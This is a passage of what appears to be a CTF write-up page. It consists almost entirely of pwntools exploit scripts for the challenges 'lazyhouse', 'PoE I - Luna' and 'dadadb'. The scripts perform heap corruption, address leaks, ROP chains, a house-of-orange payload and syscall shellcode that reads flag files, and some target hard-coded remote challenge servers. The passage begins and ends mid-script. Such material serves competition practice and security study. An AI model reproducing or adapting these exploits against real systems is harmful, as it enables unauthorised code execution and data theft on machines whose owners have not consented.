    payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x141</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)
    payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x141</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)
    buy_house(<span class="hljs-number">1</span>, <span class="hljs-number">0x650</span>, payload)
    buy_house(<span class="hljs-number">3</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'\x00'</span>)
    buy_house(<span class="hljs-number">4</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'\x00'</span>)
    sell(<span class="hljs-number">5</span>)
    libc.address = libc_addr
    free_hook = libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]
    mprotect = libc.symbols[<span class="hljs-string">'mprotect'</span>]
    open_addr = libc.symbols[<span class="hljs-string">'open'</span>]
    poprdi = libc_addr + <span class="hljs-number">0x26542</span>
    poprdxrsi = libc_addr + <span class="hljs-number">0x012bdc9</span>
    poprsi = libc_addr + <span class="hljs-number">0x026f9e</span>
    leave_ret = libc_addr + <span class="hljs-number">0x0000000000058373</span>
    longjmp = libc_addr + <span class="hljs-number">277552</span>
    buy_house(<span class="hljs-number">5</span>, <span class="hljs-number">0x108</span>, p64(free_hook)*(<span class="hljs-number">0x108</span>/<span class="hljs-number">8</span>))
    buy_super_house(p64(leave_ret))
    buffer_addr = heap_addr + <span class="hljs-number">0xae0</span>
    read_addr = libc.symbols[<span class="hljs-string">'read'</span>]
    write_addr = libc.symbols[<span class="hljs-string">'write'</span>]
    payload = p64(heap_addr) + p64(poprdi) + p64(heap_addr) + p64(poprdxrsi) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0x1000</span>) +  p64(mprotect)
    payload += p64(buffer_addr + <span class="hljs-number">0x40</span>)
    payload += <span class="hljs-string">'\x90'</span>*<span class="hljs-number">0x8</span>
    code = asm(pwnlib.shellcraft.amd64.linux.syscall(<span class="hljs-string">'SYS_open'</span>,buffer_addr + <span class="hljs-number">0x300</span>, <span class="hljs-number">2</span>))
    code += asm(pwnlib.shellcraft.amd64.linux.syscall(<span class="hljs-string">'SYS_read'</span>, <span class="hljs-string">'rax'</span>, heap_addr, <span class="hljs-number">0x100</span>))
    code += asm(pwnlib.shellcraft.amd64.linux.syscall(<span class="hljs-string">'SYS_write'</span>, <span class="hljs-number">1</span> , heap_addr, <span class="hljs-number">0x100</span>))
    code += asm(pwnlib.shellcraft.amd64.linux.syscall(<span class="hljs-string">'SYS_exit'</span>, <span class="hljs-number">0</span>))
    payload += code 
    <span class="hljs-comment">#upgrade(1, payload.ljust(0x300, '\x00') + "./flag")</span>
    upgrade(<span class="hljs-number">1</span>, payload.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">'\x00'</span>) + <span class="hljs-string">'/home/lazyhouse/flag'</span>)
    <span class="hljs-comment">#pause()</span>
    buy_house(<span class="hljs-number">2</span>, str(buffer_addr))
    p.interactive()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-comment">#GameStart('3.115.121.123', 5731, 0)</span>
    GameStart(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">23335</span>, <span class="hljs-number">0</span>)</code></pre><h3 id="poe-i---luna-[284pts]"><a class="header-link" href="#poe-i---luna-[284pts]"></a>PoE I - Luna [284pts]</h3>
<pre class="hljs"><code><span class="hljs-comment">#! /usr/bin/env python2</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-comment"># vim:fenc=utf-8</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Copyright Â© 2018 anciety &lt;anciety@anciety-pc&gt;</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Distributed under terms of the MIT license.</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> os.path
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(os=<span class="hljs-string">'linux'</span>, arch=<span class="hljs-string">'amd64'</span>, log_level=<span class="hljs-string">'debug'</span>)
context.terminal = [<span class="hljs-string">'ancyterm'</span>, <span class="hljs-string">'-s'</span>, <span class="hljs-string">'192.168.142.1'</span>, <span class="hljs-string">'-t'</span>, <span class="hljs-string">'alacritty'</span>, <span class="hljs-string">'-e'</span>]

<span class="hljs-comment"># synonyms for faster typing</span>
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

<span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">2</span>:
    DEBUG = <span class="hljs-number">0</span>
    HOST = sys.argv[<span class="hljs-number">1</span>]
    PORT = int(sys.argv[<span class="hljs-number">2</span>])

    p = remote(HOST, PORT)
    p.ru(<span class="hljs-string">'of:\n'</span>)
    hashcash = p.rl()
    res = raw_input()
    p.sl(res)
<span class="hljs-keyword">else</span>:
    DEBUG = <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">2</span>:
        PATH = sys.argv[<span class="hljs-number">1</span>]

    p = process(PATH)


<span class="hljs-comment"># by w1tcher who dominates pwnable challenges</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">house_of_orange</span><span class="hljs-params">(head_addr, system_addr, io_list_all)</span>:</span>
    payload = <span class="hljs-string">b'/bin/sh\x00'</span>
    payload = payload + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) + p64(io_list_all - <span class="hljs-number">16</span>)
    payload = payload + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(system_addr) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span>
    payload = payload + p64(head_addr + <span class="hljs-number">18</span> * <span class="hljs-number">8</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(<span class="hljs-number">0</span>) + \
            p64(<span class="hljs-number">0xffffffffffffffff</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(head_addr + <span class="hljs-number">12</span> * <span class="hljs-number">8</span>)
    <span class="hljs-keyword">return</span> payload


orig_attach = gdb.attach
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gdb_attach</span><span class="hljs-params">(*args, **kwargs)</span>:</span>
    <span class="hljs-keyword">if</span> DEBUG:
        orig_attach(*args, **kwargs)
gdb.attach = gdb_attach

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span><span class="hljs-params">(f)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapped_cmd</span><span class="hljs-params">(*args, **kwargs)</span>:</span>
        p.ru(<span class="hljs-string">'&gt;&gt;&gt; '</span>)
        f(*args, **kwargs)
    <span class="hljs-keyword">return</span> wrapped_cmd


<span class="hljs-meta">@cmd</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">insert</span><span class="hljs-params">(idx, content)</span>:</span>
    p.sl(<span class="hljs-string">'i {} {}'</span>.format(idx, content))

<span class="hljs-meta">@cmd</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cut</span><span class="hljs-params">(idx, count)</span>:</span>
    p.sl(<span class="hljs-string">'c {} {}'</span>.format(idx, count))

<span class="hljs-meta">@cmd</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new_tab</span><span class="hljs-params">()</span>:</span>
    p.sl(<span class="hljs-string">'n'</span>)

<span class="hljs-meta">@cmd</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">switch</span><span class="hljs-params">(to)</span>:</span>
    p.sl(<span class="hljs-string">'s {}'</span>.format(to))

<span class="hljs-meta">@cmd</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">paste</span><span class="hljs-params">(idx)</span>:</span>
    p.sl(<span class="hljs-string">'p {}'</span>.format(idx))

<span class="hljs-meta">@cmd</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">replace</span><span class="hljs-params">(idx, length, c)</span>:</span>
    p.sl(<span class="hljs-string">'r {} {} {}'</span>.format(idx, length, c))

<span class="hljs-meta">@cmd</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx, length)</span>:</span>
    p.sl(<span class="hljs-string">'D {} {}'</span>.format(idx, length))

<span class="hljs-meta">@cmd</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span><span class="hljs-params">(idx, size)</span>:</span>
    p.sl(<span class="hljs-string">'d {} {}'</span>.format(idx, size))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    p.ru(<span class="hljs-string">'Luna - '</span>)
    p.ru(<span class="hljs-string">'--------------'</span>)
    insert(<span class="hljs-number">0</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">0xf8</span>)
    new_tab() <span class="hljs-comment"># 1</span>
    insert(<span class="hljs-number">0</span>, <span class="hljs-string">'b'</span> * <span class="hljs-number">0x10</span>)
    cut(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment"># full cut</span>
    switch(<span class="hljs-number">0</span>)
    cut(<span class="hljs-number">0</span>, <span class="hljs-number">0xf0</span>) <span class="hljs-comment"># partial cut</span>

    <span class="hljs-comment"># now the pastebin should have a cache of 0x10, but length of 0x200</span>
    <span class="hljs-comment"># transfer pastebin to current tab</span>
    new_tab() <span class="hljs-comment"># 2</span>
    paste(<span class="hljs-number">0</span>)

    <span class="hljs-comment"># now we can use replace to OOB write the heap (on tab #2)</span>
    <span class="hljs-comment"># but let's get out a freed chunk first</span>
    new_tab() <span class="hljs-comment"># 3</span>
    insert(<span class="hljs-number">0</span>, <span class="hljs-string">'f'</span> * <span class="hljs-number">0xf8</span>)
    new_tab() <span class="hljs-comment"># 4</span>
    insert(<span class="hljs-number">0</span>, <span class="hljs-string">'g'</span> * <span class="hljs-number">0xf8</span>)
    switch(<span class="hljs-number">3</span>)
    <span class="hljs-comment">#raw_input('&gt;&gt; break free')</span>
    delete(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>) <span class="hljs-comment"># free(chunk of size(0x208))</span>
    switch(<span class="hljs-number">4</span>)
    delete(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>)

    switch(<span class="hljs-number">2</span>)

    <span class="hljs-comment"># target 0xd10</span>
    <span class="hljs-comment"># we are at 0xc80</span>

    __free_hook = target = <span class="hljs-number">0x6D9E78</span> <span class="hljs-comment"># __free_hook</span>
    idx = <span class="hljs-number">0xd10</span> - <span class="hljs-number">0xc80</span>

    packed = p64(target)

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(packed)):
        c = packed[i]
        replace(idx + i, <span class="hljs-number">1</span>, c)

    new_tab() <span class="hljs-comment"># 3</span>
    switch(<span class="hljs-number">3</span>)

    pivot = <span class="hljs-number">0x00000000004a8f86</span> <span class="hljs-comment"># mov rsp, rcx ; ret</span>
    add_rsp_80 = <span class="hljs-number">0x0000000000416cf7</span> <span class="hljs-comment"># add rsp, 0x80 ; ret</span>
    add_rsp_d8 = <span class="hljs-number">0x0000000000410a83</span> <span class="hljs-comment"># add rsp, 0xd8 ; ret</span>
    pop_rdi_rbp = <span class="hljs-number">0x00000000004038d5</span> <span class="hljs-comment"># pop rdi ; pop rbp ; ret</span>
    pop_rdi = <span class="hljs-number">0x00000000004006a6</span> <span class="hljs-comment"># pop rdi ; ret</span>
    pop_rsi_rbp = <span class="hljs-number">0x0000000000410cee</span> <span class="hljs-comment"># pop rsi ; pop rbp ; ret</span>
    pop_rsi = <span class="hljs-number">0x0000000000411583</span> <span class="hljs-comment"># pop rsi ; ret</span>
    pop_rax_rdx_rbx = <span class="hljs-number">0x000000000048bf36</span> <span class="hljs-comment"># pop rax ; pop rdx ; pop rbx ; ret</span>
    xor_rax = <span class="hljs-number">0x0000000000445e70</span> <span class="hljs-comment"># xor rax, rax ; ret</span>
    add_rax_1 = <span class="hljs-number">0x000000000047eb80</span> <span class="hljs-comment"># add rax, 1 ; ret</span>
    syscall = <span class="hljs-number">0x47f927</span>
    sal_edi = <span class="hljs-number">0x000000000048b1cd</span> <span class="hljs-comment"># sal edi, 0xd8 ; ret</span>
    mov_edi_edx = <span class="hljs-number">0x0000000000497b71</span> <span class="hljs-comment"># mov edi, edx ; mov byte ptr [rsi], al ; jne 0x497b59 ; mov rax, rsi ; ret</span>
    xchg_eax_ebp = <span class="hljs-number">0x00000000004517bf</span> <span class="hljs-comment"># xchg eax, ebp ; ret</span>
    add_eax_3 = <span class="hljs-number">0x000000000047eb91</span> <span class="hljs-comment"># add eax, 3 ; ret</span>
    mov_rax_1 = <span class="hljs-number">0x000000000047ebb0</span> <span class="hljs-comment"># mov rax, 1 ; ret </span>
    mov_rax_2 = <span class="hljs-number">0x000000000047ebc0</span> <span class="hljs-comment"># mov rax, 2 ; ret</span>
    mov_rax_3 = <span class="hljs-number">0x000000000047ebd0</span> <span class="hljs-comment"># mov rax, 3 ; ret</span>
    xor_eax = <span class="hljs-number">0x000000000040feed</span> <span class="hljs-comment"># xor eax, eax ; ret</span>

    pop_rdx = <span class="hljs-number">0x000000000044ab35</span> <span class="hljs-comment"># pop rdx ; ret </span>
    pop_rdx_rbx = <span class="hljs-number">0x000000000048bf37</span> <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span>
    open_fn = <span class="hljs-number">0x44aa80</span>
    read_fn = <span class="hljs-number">0x44ab20</span>
    puts_fn = <span class="hljs-number">0x411720</span>
    fputs_fn = <span class="hljs-number">0x479770</span>

    data = <span class="hljs-number">0x6da100</span>
    <span class="hljs-comment"># 0x44 X</span>
    <span class="hljs-comment">## 0x15 X</span>
    flag1_addr = data
    rop = p64(mov_rax_3)
    rop += p64(pop_rdi)
    rop += p64(<span class="hljs-number">2</span>)
    rop += p64(syscall)
    rop += p64(pop_rdi)
    rop += p64(flag1_addr)
    rop += p64(pop_rsi_rbp)
    rop += p64(<span class="hljs-number">0</span>)
    rop += p64(<span class="hljs-number">0</span>)
    rop += p64(mov_rax_2)
    rop += p64(syscall)

    rop += p64(pop_rdi)
    rop += p64(<span class="hljs-number">2</span>)
    rop += p64(pop_rsi_rbp)
    rop += p64(data)
    rop += p64(<span class="hljs-number">0</span>)
    rop += p64(pop_rdx_rbx)
    rop += p64(<span class="hljs-number">0x100</span>)
    rop += p64(<span class="hljs-number">0</span>)
    rop += p64(mov_rax_1)
    rop += p64(xor_eax)
    rop += p64(syscall)
    rop += p64(pop_rdi)
    rop += p64(<span class="hljs-number">1</span>)
    rop += p64(pop_rsi_rbp)
    rop += p64(data)
    rop += p64(<span class="hljs-number">0</span>)
    rop += p64(mov_rax_1)
    rop += p64(syscall)

    print(len(rop))
    <span class="hljs-keyword">assert</span> len(rop) &lt;= <span class="hljs-number">0xf0</span>

    insert(<span class="hljs-number">0</span>, <span class="hljs-string">'flag1\x00'</span>.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">'c'</span>))
    new_tab() <span class="hljs-comment"># 4</span>
    switch(<span class="hljs-number">4</span>)
    insert(<span class="hljs-number">0</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span>)
    cut(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
    new_tab() <span class="hljs-comment"># 5</span>
    switch(<span class="hljs-number">5</span>)
    insert(<span class="hljs-number">0</span>, p64(pivot) + rop.ljust(<span class="hljs-number">0xf0</span>, <span class="hljs-string">'1'</span>))
    <span class="hljs-comment">#insert(0, p64(pivot) + '\x00' * 0xf0)</span>
    switch(<span class="hljs-number">2</span>)
    idx = <span class="hljs-number">0xcd0</span> - <span class="hljs-number">0xc80</span>
    replace(idx, <span class="hljs-number">1</span>, chr(<span class="hljs-number">0xd0</span>))
    display(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>)
    p.info(p.ru(<span class="hljs-string">'\xd0'</span>))
    leaked = <span class="hljs-string">'\xd0'</span>
    <span class="hljs-keyword">while</span> len(leaked) &lt; <span class="hljs-number">8</span>:
        leaked += p.r(<span class="hljs-number">8</span> - len(leaked))
    heap_addr = u64(leaked)
    p.info(<span class="hljs-string">'leaked heap 0x{:x}'</span>.format(heap_addr))

    switch(<span class="hljs-number">2</span>)
    replace(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, chr(<span class="hljs-number">0x60</span>))
    target = <span class="hljs-number">0x555555babeb0</span> - <span class="hljs-number">0x555555babcd0</span> + heap_addr
    payload = p32(<span class="hljs-number">0x500</span>) + p32(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(target)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(payload)):
        c = payload[i]
        replace(i, <span class="hljs-number">1</span>, c)

    new_tab()
    <span class="hljs-comment">#switch(1)</span>
    p.sl(<span class="hljs-string">'s 1'</span>)
    pop_rsp = <span class="hljs-number">0x0000000000403073</span> <span class="hljs-comment"># pop rsp ; ret</span>
    data = <span class="hljs-number">0x6da100</span>

    temp = p64(pop_rsp)
    temp += p64(__free_hook + <span class="hljs-number">8</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(temp)):
        c = temp[i]
        replace(i, <span class="hljs-number">1</span>, c)


    switch(<span class="hljs-number">2</span>)
    <span class="hljs-comment">#target = 0x555555babeb0 - 0x555555babcd0 + heap_addr + 0xd8</span>
    target = data
    payload = p64(target)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(payload)):
        c = payload[i]
        replace(<span class="hljs-number">0x10</span> + i, <span class="hljs-number">1</span>, c)

    raw_input(<span class="hljs-string">'&gt;&gt; break final'</span>)
    switch(<span class="hljs-number">1</span>)
    rop = <span class="hljs-string">'/home/poe/flag1\x00'</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(rop)):
        c = rop[i]
        replace(i, <span class="hljs-number">1</span>, c)

    <span class="hljs-comment"># trigger __free_hook</span>
    switch(<span class="hljs-number">6</span>)
    paste(<span class="hljs-number">0</span>)

    p.irt()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()
</code></pre><h3 id="dadadb-[371pts]"><a class="header-link" href="#dadadb-[371pts]"></a>dadadb [371pts]</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> utility <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> pprint <span class="hljs-keyword">import</span> pprint

debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    p = pwn(<span class="hljs-string">'127.0.0.1:4869'</span>)
    ntdll_off = <span class="hljs-number">0x2a0</span> + <span class="hljs-number">32</span>
    to_ntdll = <span class="hljs-number">0x163D40</span>  <span class="hljs-comment"># 0x15ACB0</span>
    to_peb = <span class="hljs-number">0x165368</span>  <span class="hljs-comment"># 0x15C338</span>
    to_stack = <span class="hljs-number">0xcd0</span>
<span class="hljs-keyword">else</span>:
    p = pwn(<span class="hljs-string">'13.230.51.176:4869'</span>)
    ntdll_off = <span class="hljs-number">0x2a0</span> + <span class="hljs-number">32</span>
    to_ntdll = <span class="hljs-number">0x163d10</span>
    to_peb = <span class="hljs-number">0x165368</span>
    to_stack = <span class="hljs-number">0xcd0</span>
p.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>, <span class="hljs-string">'1'</span>)
p.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'orange'</span>)
p.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'godlike'</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(k)</span>:</span>
    <span class="hljs-keyword">return</span> k.ljust(<span class="hljs-number">0x40</span> - <span class="hljs-number">1</span>, <span class="hljs-string">'\x00'</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(key, buf, size=None)</span>:</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> size:
        size = len(buf)
    key = pad(key)
    p.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>, <span class="hljs-string">'1'</span>)
    p.sendlineafter(<span class="hljs-string">':'</span>, key)
    p.sendlineafter(<span class="hljs-string">':'</span>, str(size))
    <span class="hljs-keyword">if</span> len(buf) &gt;= size:
        p.sendafter(<span class="hljs-string">':'</span>, buf)
    <span class="hljs-keyword">else</span>:
        p.sendlineafter(<span class="hljs-string">':'</span>, buf)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(key)</span>:</span>
    key = pad(key)
    p.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>, <span class="hljs-string">'2'</span>)
    p.sendlineafter(<span class="hljs-string">':'</span>, key)
    p.recvuntil(<span class="hljs-string">'Data:'</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span><span class="hljs-params">()</span>:</span>
    p.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>, <span class="hljs-string">'4'</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(key)</span>:</span>
    key = pad(key)
    p.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>, <span class="hljs-string">'3'</span>)
    p.sendlineafter(<span class="hljs-string">':'</span>, key)


create(<span class="hljs-string">'\x05'</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">0x50</span>)
create(<span class="hljs-string">'\x01'</span>, <span class="hljs-string">'b'</span> * <span class="hljs-number">0x50</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'c'</span> * <span class="hljs-number">0x500</span>)
free(<span class="hljs-string">'\x05'</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'d'</span> * <span class="hljs-number">0xb0</span>)
show(<span class="hljs-string">'\x02'</span>)
p.recvuntil(<span class="hljs-string">'d'</span> * <span class="hljs-number">0xb0</span>)
data = p.recvuntil(<span class="hljs-string">'\norange'</span>, drop=<span class="hljs-number">1</span>)
data = data[<span class="hljs-number">0x18</span>:]
header = u64(data[:<span class="hljs-number">8</span>])
heap = u64(data[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])
log.info(<span class="hljs-string">'heap header: {}'</span>.format(hex(header)))
log.info(<span class="hljs-string">'heap: {}'</span>.format(hex(heap)))
ptr = heap &amp; <span class="hljs-number">0xfffffffffffff000</span>
ptr += ntdll_off
log.info(<span class="hljs-string">'target : {}'</span>.format(hex(ptr)))
free(<span class="hljs-string">'\x02'</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'c'</span> * <span class="hljs-number">0x500</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'e'</span> * <span class="hljs-number">0x58</span> + p64(header) + p64(ptr), <span class="hljs-number">0x50</span>)
show(<span class="hljs-string">'\x01'</span>)
data = p.recvuntil(<span class="hljs-string">'\norange'</span>, drop=<span class="hljs-number">1</span>)
ntdll = u64(data[:<span class="hljs-number">8</span>])
free(<span class="hljs-string">'\x02'</span>)
ntdll -= to_ntdll
log.info(<span class="hljs-string">'ntdll: {}'</span>.format(hex(ntdll)))

create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'c'</span> * <span class="hljs-number">0x500</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'e'</span> * <span class="hljs-number">0x58</span> + p64(header) + p64(ntdll + to_peb), <span class="hljs-number">0x50</span>)
show(<span class="hljs-string">'\x01'</span>)
data = p.recvuntil(<span class="hljs-string">'\norange'</span>, drop=<span class="hljs-number">1</span>)
peb = u64(data[:<span class="hljs-number">8</span>])
log.info(<span class="hljs-string">'peb: {}'</span>.format(hex(peb)))
free(<span class="hljs-string">'\x02'</span>)

create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'c'</span> * <span class="hljs-number">0x500</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'e'</span> * <span class="hljs-number">0x58</span> + p64(header) + p64(peb + to_stack), <span class="hljs-number">0x50</span>)
show(<span class="hljs-string">'\x01'</span>)
data = p.recvuntil(<span class="hljs-string">'\norange'</span>, drop=<span class="hljs-number">1</span>)
stack = u64(data[:<span class="hljs-number">8</span>])
log.info(<span class="hljs-string">'stack: {}'</span>.format(hex(stack)))
free(<span class="hljs-string">'\x02'</span>)
target_stack = stack &gt;&gt; <span class="hljs-number">16</span>
target_stack += <span class="hljs-number">1</span>
target_stack &lt;&lt;= <span class="hljs-number">16</span>
target_stack -= <span class="hljs-number">0x1000</span>
stack = target_stack
log.info(<span class="hljs-string">'stack target: {}'</span>.format(hex(target_stack)))

create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'c'</span> * <span class="hljs-number">0x500</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'e'</span> * <span class="hljs-number">0x58</span> + p64(header) + p64(target_stack) + p64(<span class="hljs-number">0x1000</span>), <span class="hljs-number">0x50</span>)
show(<span class="hljs-string">'\x01'</span>)
data = p.recvuntil(<span class="hljs-string">'\norange'</span>, drop=<span class="hljs-number">1</span>)
index = data.find(<span class="hljs-string">'\x19'</span> + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">15</span>) - <span class="hljs-number">0xd8</span>
base = u64(data[index:index + <span class="hljs-number">8</span>]) - <span class="hljs-number">0x1E38</span>
log.info(<span class="hljs-string">'base: '</span> + hex(base))
target_stack += index
log.info(<span class="hljs-string">'stack target: {}'</span>.format(hex(target_stack)))
free(<span class="hljs-string">'\x02'</span>)

encode = heap &amp; <span class="hljs-number">0xfffffffffffff000</span>
encode += <span class="hljs-number">0x88</span>
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'c'</span> * <span class="hljs-number">0x500</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'e'</span> * <span class="hljs-number">0x58</span> + p64(header) + p64(encode), <span class="hljs-number">0x50</span>)
show(<span class="hljs-string">'\x01'</span>)
data = p.recvuntil(<span class="hljs-string">'\norange'</span>, drop=<span class="hljs-number">1</span>)
encode = u64(data[:<span class="hljs-number">8</span>])
log.info(<span class="hljs-string">'encode: {}'</span>.format(hex(encode)))
free(<span class="hljs-string">'\x02'</span>)

create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'c'</span> * <span class="hljs-number">0x500</span>)
create(<span class="hljs-string">'\x02'</span>, <span class="hljs-string">'e'</span> * <span class="hljs-number">0x58</span> + p64(header) + p64(base + <span class="hljs-number">0x3000</span>), <span class="hljs-number">0x50</span>)
show(<span class="hljs-string">'\x01'</span>)
data = p.recvuntil(<span class="hljs-string">'\norange'</span>, drop=<span class="hljs-number">1</span>)
kernel32 = u64(data[:<span class="hljs-number">8</span>]) - <span class="hljs-number">0x22680</span>
log.info(<span class="hljs-string">'kernel32: {}'</span>.format(hex(kernel32)))
<span class="hljs-comment"># free('\x02')</span>
fake = heap &amp; <span class="hljs-number">0xfffffffffffff000</span>
fake += <span class="hljs-number">0xc20</span>
create(<span class="hljs-string">'a'</span>, <span class="hljs-string">'1'</span> * <span class="hljs-number">0x100</span>)
create(<span class="hljs-string">'b'</span>, <span class="hljs-string">'2'</span> * <span class="hljs-number">0x20</span>)
create(<span class="hljs-string">'c'</span>, <span class="hljs-string">'3'</span> * <span class="hljs-number">0x200</span>)
create(<span class="hljs-string">'d'</span>, <span class="hljs-string">'4'</span> * <span class="hljs-number">0x20</span>)
create(<span class="hljs-string">'e'</span>, <span class="hljs-string">'5'</span> * <span class="hljs-number">0x500</span>)
create(<span class="hljs-string">'f'</span>, <span class="hljs-string">'6'</span> * <span class="hljs-number">0x80</span>)
create(<span class="hljs-string">'g'</span>, <span class="hljs-string">'7'</span> * <span class="hljs-number">0x80</span>)

free(<span class="hljs-string">'a'</span>)
free(<span class="hljs-string">'c'</span>)
create(<span class="hljs-string">'e'</span>, <span class="hljs-string">'8'</span> * <span class="hljs-number">0x178</span> + p64(encode ^ <span class="hljs-number">0x1000001806010007</span>) + p64(heap) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">'nonick'</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">'.'</span>) + p64(
    encode ^ <span class="hljs-number">0x1000000702010003</span>) + <span class="hljs-string">'nonick'</span>.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">'.'</span>) + p64(encode ^ <span class="hljs-number">0x328000028</span>) + p64(base + <span class="hljs-number">0x5630</span>), <span class="hljs-number">0x170</span>)
logout()
p.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>, <span class="hljs-string">'1'</span>)
p.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'orange\x00\x00'</span> + p64(encode ^ <span class="hljs-number">0x328000028</span>) + p64(fake) + p64(fake)[:<span class="hljs-number">-1</span>])
p.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'godlike'</span>)
payload = p64(base + <span class="hljs-number">0x5630</span>) * <span class="hljs-number">2</span>
payload += p64(stack) * <span class="hljs-number">2</span>
payload += p32(<span class="hljs-number">0</span>)
